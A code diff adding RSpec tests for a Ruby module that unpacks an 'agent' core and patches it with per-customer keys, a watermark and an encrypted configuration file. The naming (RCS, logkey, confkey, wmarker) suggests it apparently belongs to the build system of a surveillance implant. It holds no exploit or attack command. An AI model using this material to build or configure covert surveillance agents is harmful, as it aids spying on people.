@@ -110,6 +110,10 @@ module DB
         expect(File.exists? extracted_core_path).to be_true
         expect(File.exists? subject_loaded.core_filepath).to be_false
       end
+
+      it 'fills the "outputs" array with the core filename' do
+        expect { subject_loaded.unpack }.to change(subject_loaded, :outputs).from([]).to(['core'])
+      end
     end
 
     let :subject_unpacked do
@@ -121,10 +125,13 @@ module DB
 
       let!(:signature) { ::Signature.create! scope: 'agent', value: "#{'X'*31}S" }
 
+      let(:factory_configuration) { Configuration.new config: 'h3llo' }
+
       let(:string_32_bytes_long) { 'w3st'*8 }
 
       before do
         factory.update_attributes logkey: "#{'X'*31}L", confkey: "#{'X'*31}C", ident: 'RCS_XXXXXXXXXA'
+        factory.configs << factory_configuration
 
         subject_unpacked.stub(:license_magic).and_return 'XXXXXXXM'
         subject_unpacked.stub(:hash_and_salt).and_return string_32_bytes_long
@@ -139,6 +146,21 @@ module DB
         expect(patched_content).to binary_include "pre_customer_key=#{string_32_bytes_long}"
         expect(patched_content).to binary_match /agent_id\=.{4}XXXXXXXXXA/
         expect(patched_content).to binary_match /wmarker=XXXXXXXM.{24}/
+      end
+
+      context 'when the "config" param is present' do
+
+        let(:encrypted_config_data) { "\xD9\xED\x94\\\xECG\x9C\x8C\x8B\x1D\x18\x135\xDD?\x96E\b\xC7\xD1\xDC\bUq\x1F\xC3\xAFg\xBCa\xC15" }
+
+        it 'write an encrypted configuration file' do
+          subject_unpacked.patch core: 'core', config: 'cfg1'
+          configuration_file_content = File.read subject_unpacked.path 'cfg1'
+          expect(configuration_file_content).to binary_equals encrypted_config_data
+        end
+
+        it 'fills the "outputs" array with the configuration filename' do
+          expect { subject_unpacked.patch core: 'core', config: 'cfg1' }.to change(subject_unpacked, :outputs).from(['core']).to(['core', 'cfg1'])
+        end
       end
     end
   end
